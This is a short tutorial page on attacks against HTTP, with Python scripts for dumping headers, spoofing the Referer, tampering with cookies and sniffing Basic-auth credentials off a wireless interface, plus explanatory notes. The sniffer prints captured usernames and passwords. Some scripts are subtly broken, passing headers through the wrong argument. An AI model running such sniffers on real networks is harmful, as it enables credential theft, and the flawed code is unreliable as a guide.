# Attacks on http

## Attack tree

```text
1 HTTP header dumping
2 Referer spoofing
3 Manipulation of cookies
4 Auth sniffing
```

## Examples

### HTTP header dumping

For HTTPS connection specify the keyword argument `verify=False`
to suppress the verification of the validity of the SSL certificate. This can for example be
handsome for servers that use self-signed certificates.

```python
#!/usr/bin/python3

import sys
import requests

if len(sys.argv) < 2:
    print(sys.argv[0] + ": <url>")
    sys.exit(1)

r = requests.get(sys.argv[1])

for field, value in r.headers.items():
    print(field + ": " + value)
```

### Referer spoofing

```python
#!/usr/bin/python3

import sys
import requests

if len(sys.argv) < 2:
    print(sys.argv[0] + ": <url>")
    sys.exit(1)

headers = {'Referer': 'http://www.target.com'}
r = requests.get(sys.argv[1], data=headers)

print(r.content)
```

### Manipulation of cookies

```python
#!/usr/bin/python3

import sys
import requests

if len(sys.argv) < 3:
    print(sys.argv[0] + ": <url> <key> <value>")
    sys.exit(1)

headers = {'Cookie': sys.argv[2] + '=' + sys.argv[3]}
r = requests.get(sys.argv[1], data=headers)

print(r.content)
```

### Auth sniffing

```python
#!/usr/bin/python3

import re
from base64 import b64decode
from scapy.all import sniff

dev = "wlan0"

def handle_packet(packet):
    tcp = packet.getlayer("TCP")
    match = re.search(r"Authorization: Basic (.+)",
                      str(tcp.payload))

    if match:
        auth_str = b64decode(match.group(1))
        auth = auth_str.split(":")
        print("User: " + auth[0] + " Pass: " + auth[1])

sniff(iface=dev,
      store=0,
      filter="tcp and port 80",
      prn=handle_packet)
```

## Notes

### HTTP header dumping

Dump all HTTP header options received by a web server onto the screen.

### Referer spoofing

The `referer` contains the URL a request is originating from. Some web applications use it as a security
feature to figure out if the request comes from an internal network and if so, concludes that the user must therefore 
be logged in. Not a good idea as the referer header can freely be manipulated.

### Manipulation of cookies

HTTP is a stateless protocol. Every request sent by a client is independent of other requests. 
Developers can circumvent the stateless property of HTTP by pinning individual and hard-to-guess numbers to 
visitors in a `session id`. This id is then sent with every request to identify a client. It is valid for one session 
and deleted after a logout process or timeout. And it may get saved into a cookie. The complete cookie data gets sent
with every request belonging to the domain or host the cookie was generated from. And can be stolen and used. 
One does not expect them to get manipulated like HTTP headers, which makes them even more attractive. 

Cookies are sent with the help of the Cookie header and consist of key/value pairs
separated by a semicolon. The server uses the Set-Cookie header to ask the client to save
a cookie.

Some cookies are only valid for the current session and some until a
specific time unit like one day. If no `Expires` option was specified, the cookie is a session
cookie and gets restored after reopening the browser and restoring old sessions. 
If the word `Secure` appears in the cookie data this means that the cookie should only be sent over
HTTPS connections. This does not make it any more secure against manipulation.

### Auth sniffing

Most HTTP authentications are running in Basic mode. The login data is transferred in plaintext when selecting 
this method It may look like encrypted data, but it is only encoded with Base64 before it is sent over
the net.

In the payload search for the string `Authorization: Basic` and cut the following Base64 string
with the help of a regular expression. If this was successful, decode the string and split
by the colon into username and password. That is all it takes to circumvent `HTTP-Basic-Auth`.
